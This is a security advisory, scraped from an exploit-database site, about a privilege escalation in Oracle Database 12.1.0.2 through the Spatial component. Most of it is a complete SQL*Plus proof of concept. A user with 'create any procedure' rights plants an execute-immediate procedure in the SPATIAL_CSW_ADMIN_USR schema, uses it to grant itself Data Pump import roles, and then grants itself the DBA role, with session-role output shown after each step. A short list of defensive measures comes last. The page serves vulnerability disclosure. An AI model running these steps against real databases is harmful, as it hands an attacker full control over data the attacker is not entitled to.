---
title: Oracle Database 12.1.0.2 Spatial Component Privilege Escalation
url: https://cxsecurity.com/issue/WLB-2023020011
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-02-07
fetch_date: 2025-10-04T05:48:50.083798
---

# Oracle Database 12.1.0.2 Spatial Component Privilege Escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Oracle Database 12.1.0.2 Spatial Component Privilege Escalation** **2023.02.06**  Credit:  **[Emad Al-Mousa](https://cxsecurity.com/author/Emad%2BAl-Mousa/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **[CWE-264](https://cxsecurity.com/cwe/CWE-264 "Click to see CWE-264")** | |

Title: Oracle Database Privilege Escalation Through Oracle Spatial Component
Product: Database
Manufacturer: Oracle
Affected Version(s): 12.1.0.2
Tested Version(s): 12cR1
Risk Level: High
Solution Status: Fixed in Oracle Critical Patch Update October 2021
CVE Reference: N/A, Backported in Oracle CPU OCT 2021
Author of Advisory: Emad Al-Mousa
Overview:
Privilege Escalation is a famous security vulnerability (explitation technique)..... attackers seek to compromoise IT systems for multiple objectives such as data exfiltration, cause outage,....etc.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Vulnerability Details:
The following is a privilege escalation vulnerability where an attacker can escalate his/her account permissions to "DBA" role. DBA role in Oracle is a very powerfull role where the user can view & edit any data within the database, create database objects (tables,malcious code,....etc) and many other harmful activities. The vulnerability exists IF the database system has Oracle "Spatial" component is installed. This vulnerability existed in Oracle 12cR1 and backport fix was issued in October 2021.
To check if Oracle Spatial Component is installed, run the following SQL query as it will list ALL installed components within the database system:
SQL> select comp\_name from dba\_registry;
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
Proof of Concept (PoC):
// I will create an account called ironman using SYS account, the account will be granted “create session” to connect to the database and “create any procedure”, and “execute any procedure” permissions:
sqlplus / as sysdba
SQL> create user ironman identified by iron\_123;
SQL> grant create session to ironman;
SQL> grant create any procedure to ironman;
SQL> grant execute any procedure to ironman;
SQL> exit;
// I will now connect using the newly created account “ironman” using sql plus
sqlplus ironman/iron\_123
SQL> show user
USER is “IRONMAN”
SQL> select \* from session\_roles;
no rows selected
SQL> create or replace procedure SPATIAL\_CSW\_ADMIN\_USR.hulk (SQL\_TEXT IN VARCHAR2) as
BEGIN
EXECUTE IMMEDIATE (SQL\_TEXT);
END hulk;
/
SQL> execute SPATIAL\_CSW\_ADMIN\_USR.hulk('grant DATAPUMP\_IMP\_FULL\_DATABASE to ironman');
SQL> select \* from session\_roles;
no rows selected
SQL> set role DATAPUMP\_IMP\_FULL\_DATABASE;
// ironman account is escalated to the role DATAPUMP\_IMP\_FULL\_DATABASE
SQL> select \* from session\_roles;
ROLE
——————————————————————————–
DATAPUMP\_IMP\_FULL\_DATABASE
EXP\_FULL\_DATABASE
SELECT\_CATALOG\_ROLE
HS\_ADMIN\_SELECT\_ROLE
HS\_ADMIN\_ROLE
HS\_ADMIN\_EXECUTE\_ROLE
EXECUTE\_CATALOG\_ROLE
IMP\_FULL\_DATABASE
8 rows selected.
// the next escalation level is to DBA role !!
SQL> grant dba to ironman;
SQL> set role dba;
SQL> select \* from session\_roles;
ROLE
——————————————————————————–
DBA
SELECT\_CATALOG\_ROLE
HS\_ADMIN\_SELECT\_ROLE
HS\_ADMIN\_ROLE
HS\_ADMIN\_EXECUTE\_ROLE
EXECUTE\_CATALOG\_ROLE
DELETE\_CATALOG\_ROLE
EXP\_FULL\_DATABASE
Advertisements
Report this ad
IMP\_FULL\_DATABASE
DATAPUMP\_EXP\_FULL\_DATABASE
DATAPUMP\_IMP\_FULL\_DATABASE
ROLE
——————————————————————————–
GATHER\_SYSTEM\_STATISTICS
SCHEDULER\_ADMIN
XDBADMIN
XDB\_SET\_INVOKER
JAVA\_ADMIN
JAVA\_DEPLOY
WM\_ADMIN\_ROLE
CAPTURE\_ADMIN
OPTIMIZER\_PROCESSING\_RATE
EM\_EXPRESS\_ALL
EM\_EXPRESS\_BASIC
22 rows selected.
--- Conclusion:
The account ironman has been successfully elevated to the “DBA” role which is the highest database role in Oracle database system.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
- Defensive Techniques:
configure auditing to catch any privilege escalation attempts.
review database account permissions on regular basis.
ensure database accounts have strong passwords, and rotate passwords regularly if possible.
perform VA (vulnerability assesment) scans on regular basis.
pro-actively patch your systems and database systems.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
References:
https://www.oracle.com/security-alerts/cpuoct2021.html
https://databasesecurityninja.wordpress.com/2021/10/22/oracle-database-privilege-escalation-through-oracle-spatial-component/comment-page-1/
Credit:
Security-In-Depth Contributors: Emad Al-Mousa

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023020011)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top